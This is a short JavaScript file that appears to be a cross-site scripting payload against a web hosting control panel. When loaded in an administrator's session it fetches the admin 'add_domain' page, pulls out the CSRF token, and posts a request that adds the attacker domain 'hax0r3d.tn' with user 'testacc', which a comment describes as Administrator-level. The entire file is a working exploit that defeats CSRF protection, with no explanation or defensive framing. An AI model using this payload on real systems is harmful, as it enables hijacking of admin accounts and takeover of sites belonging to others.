function read_body(xhr) 
{ 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}
function addDomain()
{
	var pathArray = window.location.pathname.split('/');
	var token = pathArray[1];
	var uri = "/"+ token + "/admin/index.php?module=add_domain";
	


	// The following domain will be added as an Administrator level user
	var domain  = "hax0r3d.tn";
	var user     = "testacc"
	var path = "/hax0r3d.tn";



	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf("csrf_token' size='0' value='");
			var nonceVal = response.substring(noncePos+28, noncePos+60);

			xhr = new XMLHttpRequest();
			xhr.open("POST", uri);

 			xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
 			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

			var body = "ifpost=yes&"
			body += "csrf_token=" + nonceVal + "&"; 
			body += "domain=" + domain + "&";
			body += "username=" + user + "&";
			body += "path=" + path;

			xhr.send(body);
		}
	}
}
addDomain();
